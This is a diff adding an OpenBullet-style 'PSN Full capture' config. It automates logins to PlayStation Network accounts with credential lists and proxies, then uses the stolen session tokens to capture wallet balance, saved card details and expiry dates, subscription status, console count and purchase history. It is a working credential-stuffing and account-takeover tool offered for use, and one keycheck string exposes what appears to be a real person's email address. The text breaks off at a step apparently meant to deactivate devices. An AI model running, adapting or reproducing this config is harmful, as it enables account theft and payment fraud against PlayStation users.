@@ -1,0 +1,508 @@
+[SETTINGS]
+{
+  "Name": "PSN Full capture",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-23T15:22:39.1903403+04:30",
+  "AdditionalInfo": "use HQ proxies",
+  "Author": "@Perfex_Channel",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": true,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BROWSERACTION Open 
+
+NAVIGATE "https://id.sonyentertainmentnetwork.com/id/tv/signin/#/signin" 
+
+ELEMENTACTION Selector "#ember14" 
+  WaitForElement 
+
+ELEMENTACTION Selector "#ember14" 
+  Click 
+
+ELEMENTACTION Id "#ember14" 
+  Click 
+
+ELEMENTACTION Selector "#ember14" 
+  SendKeys "<USER>" 
+
+ELEMENTACTION Selector "#ember17" 
+  Click 
+
+ELEMENTACTION Selector "#ember17" 
+  Click 
+
+ELEMENTACTION Selector "#ember17" 
+  SendKeys "<PASS>" 
+
+ELEMENTACTION Selector "#ember19" 
+  Click 
+
+ELEMENTACTION Id "#ember14" 
+  Click 
+
+ELEMENTACTION Selector "#ember14" 
+  Click 
+
+ELEMENTACTION XPath "//*[@id=\"ember19\"]/div[3]/div/div[3]/div" 
+  WaitForElement 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The sign-in ID (email address) or password is not correct." 
+    KEY "This email address is already associated with an account on a different Sony group service. Link your account to use it here." 
+  KEYCHAIN Success OR 
+    KEY "An error occurred during communication with the server." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Your account has been locked. Reset your password." 
+    KEY "2-step verification is enabled. Check your mobile phone for a text message. Enter that code into the Enter Code field." 
+    KEY "email_verification" 
+    KEY "If your account has been locked, wait a while, and then try signing in again.<br>If your password has been reset, an email has been sent to leenaftis123@hotmail.com. Follow the instructions in the email and reset your password" 
+    KEY "Either your account has been locked due to multiple failed sign-in attempts, or your password needs to be reset due to security reasons." 
+    KEY "<div dir=\"auto\" data-components=\"ds-message-content\" id=\"ember38\" class=\"message-content alignLeft ember-view\">                2-step verification is enabled. Check your mobile phone for a text message about your account. Enter that code into the Enter Code field." 
+  KEYCHAIN Ban AND 
+    KEY "A connection to the server could not be established.<br>(18" 
+
+NAVIGATE "https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie" 
+
+ELEMENTACTION XPath "/html/body/pre" 
+  WaitForElement 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "A connection to the server could not be established" 
+    KEY "The connection to the server timed out" 
+  KEYCHAIN Success OR 
+    KEY "npsso" 
+  KEYCHAIN Failure OR 
+    KEY "error\":\"invalid_grant" 
+    KEY "Invalid login" 
+
+BROWSERACTION GetCookies 
+
+#NPSSO PARSE "<SOURCE>" LR "npsso\":\"" "\"" -> VAR "NPSSO" 
+
+REQUEST OPTIONS "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorizeCheck" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "access-control-request-headers: content-type,x-referer-info" 
+  HEADER "access-control-request-method: POST" 
+  HEADER "connection: keep-alive" 
+  HEADER "host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "origin: https://id.sonyentertainmentnetwork.com" 
+  HEADER "referer: https://id.sonyentertainmentnetwork.com/" 
+  HEADER "sec-fetch-mode: corssec-fetch-site:same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+
+REQUEST POST "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorizeCheck" 
+  CONTENT "{\"npsso\":\"<NPSSO>\",\"client_id\":\"ce381e15-9cdd-4cf9-8384-0cf63db17f6a\",\"scope\":\"openid:user_id openid:online_id openid:ctry_code openid:lang user:account.communication.get kamaji:get_account_hash oauth:manage_user_auth_sessions openid:acct_uuid user:account.authentication.mode.get user:account.phone.masked.get user:account.notification.create openid:content_ctrl user:account.subaccounts.get openid:age user:account.graduate user:verifiedAccount.get kamaji:account_link_user_link_account kamaji:get_internal_entitlements ias:account.onlineIdChange.get user:account.onlineId.get user:onlineIdSuggestion.get kamaji:activity_feed_set_feed_privacy user:account.identityMapper user:account.email.create user:account.emailVerification.get user:account.personal.get user:account.tosua.update\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "content-length: 844" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "origin: https://id.sonyentertainmentnetwork.com" 
+  HEADER "referer: https://id.sonyentertainmentnetwork.com/" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "x-referer-info: https://id.sonyentertainmentnetwork.com/signin/?ui=pr&response_type=token&redirect_uri=https%3A%2F%2Fid.sonyentertainmentnetwork.com%2Fid%2Fmanagement%2F%23%2Fp%3Fpr_referer%3Dcam%26entry%3D%252Fp&client_id=ce381e15-9cdd-4cf9-8384-0cf63db17f6a&state=e72c1a7ddab1ac187fb04452f41a664d&entry=%2Fp&error=login_required&error_code=4165&error_description=User+is+not+authenticated&no_captcha=true" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "ToSUA must be re-accepted" 
+    KEY "Account not linked to PSN" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Password expired" 
+    KEY "Password credentials are locked" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Banned account" 
+
+#BIRTHREQUEST REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2C3DS%3AtransactionData.update&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3De7777956-5f44-476d-b2b1-e51115abd739" AcceptEncoding=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+
+#CODEBIRTH PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "CODEBIRTH" 
+
+#CODEBIRTH REQUEST GET "https://accounts.api.playstation.com/api/v1/accounts/me/core" AcceptEncoding=FALSE AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Authorization: Bearer <CODEBIRTH>" 
+  HEADER "Accept-Language: en-GB, en; q=0.9, en-US; q=0.8" 
+  HEADER "Referer: https://store.playstation.com/en-tw/download/list?smcid=pdc:id-en:web-pdc-home" 
+  HEADER "Origin: https://store.playstation.com" 
+  HEADER "Host: accounts.api.playstation.com" 
+
+#BRITDATE PARSE "<SOURCE>" LR "dateOfBirth\":\"" "\"" CreateEmpty=FALSE -> CAP "BRITDATE" 
+
+#CODERrquest REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3Db4f910c5-4af7-414f-870c-0bb245fa1162" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "referer: https://store.playstation.com/de-de/download/list" 
+  HEADER "sec-fetch-mode: nested-navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+
+#CODE1 PARSE "<ADDRESS>" LR "&code=" "&" -> VAR "CODE1" 
+
+#CODERrquest REQUEST POST "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/session" 
+  CONTENT "code=<CODE1>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "content-length: 11" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "host: store.playstation.com" 
+  HEADER "kamaji-client: valkyrie_storefront" 
+  HEADER "origin: https://store.playstation.com" 
+  HEADER "referer: https://store.playstation.com/de-de/download/list" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "x-alt-referer: https://store.playstation.com/html/webIframeRedirect.html?requestId=b4f910c5-4af7-414f-870c-0bb245fa1162" 
+
+#CountConsole REQUEST GET "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/gateway/store/v1/users/me/device/activation/count" 
+  
+  HEADER "Accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "host: store.playstation.com" 
+  HEADER "referer: https://store.playstation.com/de-de/download/list" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+
+#ActiveCosolParse PARSE "<SOURCE>" LR ":{" "}}" Recursive=TRUE -> VAR "CountConsole" 
+
+#DeviceNameAndCount FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "[\"ps4\"" VALUE "PS4" 
+  "<CountConsole>" -> VAR "DeviceNameAndCount1" 
+
+#DeviceNameAndCount FUNCTION Replace "]" "" "<DeviceNameAndCount1>" -> CAP "DeviceNameAndCount" 
+
+#AccountDeTail REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D6543d570-9d8c-4074-b5fd-9664b793e61f" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "referer: https://store.playstation.com/de-de/subscriptions" 
+  HEADER "sec-fetch-mode: nested-navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+
+#CODEID PARSE "<ADDRESS>" LR "code=" "&" -> VAR "CODEID" 
+
+#AuthurizeCodeID REQUEST POST "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/session" 
+  CONTENT "code=<CODEID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "content-length: 11" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: " 
+  HEADER "host: store.playstation.com" 
+  HEADER "kamaji-client: valkyrie_storefront" 
+  HEADER "origin: https://store.playstation.com" 
+  HEADER "referer: https://store.playstation.com/de-de/subscriptions" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "x-alt-referer: https://store.playstation.com/html/webIframeRedirect.html?requestId=6543d570-9d8c-4074-b5fd-9664b793e61f" 
+
+#COUNTRY PARSE "<SOURCE>" LR "\",\"country\":\"" "\"" -> CAP "COUNTRY" 
+
+#VALETBALANCEREQUEST REQUEST GET "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/checkout/cart" 
+  
+  HEADER "Accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "content-length: 11" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: " 
+  HEADER "host: store.playstation.com" 
+  HEADER "kamaji-client: valkyrie_storefront" 
+  HEADER "origin: https://store.playstation.com" 
+  HEADER "referer: https://store.playstation.com/de-de/subscriptions" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "x-alt-referer: https://store.playstation.com/html/webIframeRedirect.html?requestId=6543d570-9d8c-4074-b5fd-9664b793e61f" 
+
+#WALLETBALANCE PARSE "<SOURCE>" LR "wallet_balance_after_transaction\":\"" "\"" -> CAP "WALLETBALANCE" 
+
+REQUEST GET "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/gateway/store/v1/users/me/psnsubscriptions" 
+  
+  HEADER "Accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "content-length: 11" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: " 
+  HEADER "host: store.playstation.com" 
+  HEADER "kamaji-client: valkyrie_storefront" 
+  HEADER "origin: https://store.playstation.com" 
+  HEADER "referer: https://store.playstation.com/de-de/subscriptions" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "x-alt-referer: https://store.playstation.com/html/webIframeRedirect.html?requestId=6543d570-9d8c-4074-b5fd-9664b793e61f" 
+
+IF "<SOURCE>" Contains "none"
+
+FUNCTION Constant "NO" -> CAP "PLUS" 
+
+ELSE
+
+FUNCTION Constant "YES" -> CAP "PLUS" 
+
+ENDIF
+
+REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2C3DS%3AtransactionData.update%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3Db407414f-d4d2-4821-9cce-1da9404e5462" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "connection: keep-alive" 
+  HEADER "host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "referer: https://transact.playstation.com/?clientId=b9ef0004-8766-478d-9bdf-7ba4e4525db6&layout=flex&reportSuite=snestorescee-uat&platformId=CHIHIRO&disableWindows=false&schemaOverride=valkyrie-storefront" 
+  HEADER "sec-fetch-mode: nested-navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+
+#BEARER2 PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "BEARER2" 
+
+#WalletBalance REQUEST GET "https://wallets.api.playstation.com/api/v1/wallets/me" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <BEARER2>" 
+  HEADER "connection: keep-alive" 
+  HEADER "content-type: application/json" 
+  HEADER "host: wallets.api.playstation.com" 
+  HEADER "origin: https://transact.playstation.com" 
+  HEADER "referer: https://transact.playstation.com/?clientId=b9ef0004-8766-478d-9bdf-7ba4e4525db6&layout=flex&reportSuite=snestorescee-uat&platformId=CHIHIRO&disableWindows=false&schemaOverride=valkyrie-storefront" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "x-platform: CHIHIRO" 
+
+#currencyCode PARSE "<SOURCE>" LR ",\"currencyCode\":\"" "\"" -> CAP "CURRENCYCODE" 
+
+#LASTTRANSACTION PARSE "<SOURCE>" LR "\",\"lastTransactionDate\":\"" "\"" -> CAP "LASTTRANSACTION" 
+
+#CardDetail REQUEST GET "https://wallets.api.playstation.com/api/v1/wallets/me/savedInstruments" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <BEARER2>" 
+  HEADER "connection: keep-alive" 
+  HEADER "content-type: application/json" 
+  HEADER "host: wallets.api.playstation.com" 
+  HEADER "origin: https://store.playstation.com" 
+  HEADER "referer: https://store.playstation.com/de-de/download/list" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "x-platform: web" 
+  HEADER "x-requestid: acd89edf-7e90-4af9-952a-375fddb6840c" 
+
+#CARD PARSE "<SOURCE>" LR "\",\"paymentMethodId\":\"" "\"" Recursive=TRUE -> CAP "CARD" 
+
+#CARDDATEYEAR PARSE "<SOURCE>" LR "expirationYear\":" "," Recursive=TRUE -> CAP "CARDDATEYEAR" 
+
+#CARDDATEMONTH PARSE "<SOURCE>" LR "expirationMonth\":" "," Recursive=TRUE -> CAP "CARDDATEMONTH" 
+
+#GetForInformation REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3Daac5bf05-bd53-4b7f-b12b-23c5f86fc708" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.3" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#TokenForInformation PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "TKA2" 
+
+#GetInformation REQUEST GET "https://accounts.api.playstation.com/api/v1/accounts/me/core" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: accounts.api.playstation.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/" 
+  HEADER "Authorization: Bearer <TKA2>" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#TokenACID PARSE "<SOURCE>" LR "\"accountId\":\"" "\"" -> VAR "ACID" 
+
+#GetTokenGames REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3Dae1839b6-c9ed-4abf-a217-f918149c24bf" 
+  
+  HEADER "Host: auth.api.sonyentertainmentnetwork.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://id.sonyentertainmentnetwork.com/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#TokenGames PARSE "<ADDRESS>" LR "access_token=" "&token_type" -> VAR "TKA3" 
+
+#GetGames REQUEST GET "https://transaction.api.playstation.com/api/v1/s2sHistory?ownerAccountId=<ACID>&limit=500&startDate=2014-01-01T00%3A00%3A00.000%2B0330&endDate=2020-03-23T23%3A59%3A59.999%2B0430&includePurged=false&transactionTypes=CREDIT,CYCLE_SUBSCRIPTION,DEBIT,DEPOSIT_CHARGE,DEPOSIT_VOUCHER,PRODUCT_PURCHASE,VOUCHER_PURCHASE" 
+  
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: Bearer <TKA3>" 
+  HEADER "Host: transaction.api.playstation.com" 
+  HEADER "Origin: https://transact.playstation.com" 
+  HEADER "Referer: https://transact.playstation.com/transactions?authConfig=legacy&clientId=f8143e18-0549-46de-bd8f-d1ebea2ad1a9&disableWindows=false&layout=block&platformId=WEB&reportSuite=snepdrglobal" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "X-Platform: WEB" 
+
+#GetGames PARSE "<SOURCE>" LR "\"productName\":\"" "\"subTotalPrice\"" Recursive=TRUE -> VAR "GAMES0" 
+
+#FixGamesOne FUNCTION Replace "\",\"orderId\":" " @" "<GAMES0>" -> VAR "REPLACEGAME" 
+
+#FixGamesTwo FUNCTION Replace ",\"orderItemId\":" "" "<REPLACEGAME>" -> VAR "REPLACEGAME" 
+
+#FixGamesThree FUNCTION Replace "@\\d+\\d" "" UseRegex=TRUE "<REPLACEGAME>" -> VAR "REPLACEGAME" 
+
+#FixGamesFour FUNCTION Replace ",\"totalPrice\":" "[" "<REPLACEGAME>" -> VAR "REPLACEGAME" 
+
+#FixGamesFive FUNCTION Replace ",," "] --" "<REPLACEGAME>" -> CAP "GAMES" 
+
+#FixGamesSix FUNCTION Replace "--" "\\r\\n" UseRegex=TRUE "<GAMES>" -> VAR "REPLACEGAME" 
+
+FUNCTION Replace "â„¢" "™" "<REPLACEGAME>" -> VAR "REPLACEGAME" 
+
+FUNCTION Replace "Â®" "®" "<REPLACEGAME>" -> VAR "REPLACEGAME" 
+
+FUNCTION Replace "â€“" "–" "<REPLACEGAME>" -> VAR "REPLACEGAME" 
+
+FUNCTION Replace "Â£" "£" "<REPLACEGAME>" -> VAR "REPLACEGAME" 
+
+FUNCTION Replace "Â" "" "<REPLACEGAME>" -> VAR "REPLACEGAME" 
+
+#DeactiveREQUEST REQUEST GET 